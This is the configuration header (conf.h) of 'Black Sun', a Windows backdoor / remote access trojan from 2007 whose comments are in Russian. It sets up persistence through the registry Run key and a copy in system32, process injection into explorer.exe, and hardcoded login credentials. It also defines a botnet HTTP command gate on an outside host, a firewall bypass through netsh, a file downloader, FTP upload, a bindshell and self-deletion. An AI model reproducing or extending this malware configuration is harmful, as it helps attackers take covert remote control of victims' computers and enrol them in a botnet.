/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [conf.h]
 *      Конфигурационный файл RAT. Подробнее в README
 *  ---------------------------------------------------------------------
 */

	// -------------- [  настройки бэкдора ]  -------------- // 
	
	// порт бэкдора
	#define 	BINDPORT 		2121
	
	// логин:пароль
	#define		AUTH			"cytech:cytech"
	
	// -------------- [ системные настройки ]  -------------- // 
	
	// имя файла в директории system32
	#define		EXENAME			"blacksun.exe"
	
	// ключ в реестре (HKEY_LOCAL_MACHINE)
	#define		REGKEY			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"	
	
	// название подключа
	#define		REGNAME			"blacksun"   
	
	// имя мутекса
	#define		MUTEXNAME		"{F3532CE1-0832-11B1-A122-25000A276A73}" 
	
	// процесс, в контексте которого будем работать
	#define 	FIRSTINJPROC	"explorer.exe"  
	// необходимо отметить, что если в кач-ве процесса вы выбрали svchost.exe, то выводить MessageBox
	// на удаленной системе будет нельзя!
	
	// -------------- [  настройки http-бота ]  -------------- // 
	
	// использовать гейт? если нет, то закоментируйте эту строку
	#define     USEGATE
	
	// пример http://fuckinghost.org/blacksun/getcommand.php
	
	// сервер на котором стоит гейт 
	#define     HTTPSERV		"fuckinghost.org"  
	
	// порт httpd 
	#define		HTTPPORT		80			
	
	// путь до скрипта getcommand.php
	#define		HTTPPATH		"/botnet/getcommand.php"	
	
	// user-agent. руками не трогать!
	#define		USERAGENT		"blacksun"	
	
	// частота обращения бэкдора к гейту (минуты)
	#define		HTTPFREQ		15		
	
	// -------------- [  второстепенные параметры ]  -------------- // 
	
	// использовать добавление в netsh firewall? если нет, то закоментируйте эту строку
	#define     NETSHADD      
	
	// наименование "клиента" при закачке файлов по FTP
	#define		FTP_UPLOAD_CLIENT	"Blacksun-FTP-client"
	
	// адрес, где лоадер будет хранить данные о последнем скаченном файле
	#define		DATAKEY			"Software\\Microsoft\\Windows"
	
	// наименование батника создаваемого при самоудалении
	#define		SELFDEL_BAT			"self.bat"
	
	// -------------- [  сообщения для клиента ]  -------------- // 
	
	// тексты сообщений отправляемых сервером клиенту при выполнении команд
	#define		MSG_DONE			"\n done \n"
	#define		MSG_ERROR			"\n error \n"
	#define		MSG_AUTHFAILED		"\n authroization failed \n"
	#define		MSG_UNKNOWNARG		"\n unknown argument 2 \n"
	#define		MSG_UNKNOWNCMD		"\n unknown command \n"
	#define		MSG_CMDEXECUTED		"\n command executed \n"
	#define		MSG_MSGBOX			"\n messagebox ok \n"
	#define		MSG_BINDSH			"\n check bindshell now \n"
	#define		MSG_EXITPROC		"\n terminating process... \n"
	#define		MSG_KILLSELF		"\n selfdestruction started... \n"
	#define		MSG_LOADER_OK		"\n file downloaded \n"
	#define		MSG_LOADER_ERROR	"\n error downloading file \n"
	#define		MSG_LOADER_SEH		"\n SEH: failed URLDownloadToFile call \n"
	#define		MSG_EXECHIDE		"\n execution in HIDE mode done \n"
	#define		MSG_EXECSHOW		"\n execution in SHOW mode done \n"
	#define		MSG_EXECERROR		"\n error. cant execute \n"
	#define		MSG_CONNECTERROR	"\n error. cant connect \n"
	#define		MSG_FTPUPLOAD		"\n uploaded succesfull \n"
	#define		MSG_CDROMOPENED		"\n cdrom opened \n"
	#define		MSG_CDROMCLOSED		"\n cdrom closed \n"
	#define		MSG_MONON			"\n monitor on \n"
	#define		MSG_MONOFF			"\n monitor off \n"
	#define		MSG_WALLPSET		"\n wallpaper setuped, if wallpaper's format was BitMap (*.bmp) \n"
	#define		MSG_SHUTDOWNPRIV	"\n cant set shutdown privilege \n"
	#define		MSG_REBOOT			"\n rebooting... \n"
	#define		MSG_SHUTDOWN		"\n shutdowning... \n"
	#define		MSG_LOGOFF			"\n setting logoff mode... \n"
	#define		MSG_SLEEP			"\n setting sleep mode... \n"
	#define		MSG_STAND			"\n standing by... \n"
	#define		MSG_SWAPMOUSE		"\n mouse swapped \n"
	#define		MSG_UNSWAPMOUSE		"\n mouse unswapped \n"

	char 
	VERSION[]= 
	"\n :: BlackSun Remote Administrative Tool v1.0 prebeta :: "
	"\n        Darkcoded by Cytecђ, Hell Knights Crew          "
	"\n                 hellknights.void.ru                    ";
	
	// -------------- [  руками не трогать! ]  -------------- // 
	
	// адрес базы
	#define 	BASEADDRESS		0x29A00000  
	// привелегии отладчика
	#define		SE_DEBUG_PRIV 	 	"SeDebugPrivilege"
	
	// наименования DLL
	#define		KERNEL32_DLL		"kernel32.dll"
	#define		ADVAPI32_DLL		"advapi32.dll"
	#define		SHELL32_DLL			"shell32.dll"
	#define		WS2_32_DLL			"ws2_32.dll"
	#define		URLMON_DLL			"urlmon.dll"
	#define		WININET_DLL			"wininet.dll"
	#define		WINMM_DLL			"winmm.dll"
	#define		IMGHLP_DLL			"imagehlp.dll"
	#define		USER32_DLL			"user32.dll"
	
	// netsh
	#define		NETSH_ADD_1			"netsh firewall set allowedprogram "
	#define		NETSH_ADD_2			" blacksun ENABLE"
	
	// comspec
	#define		COMSPEC				"ComSpec"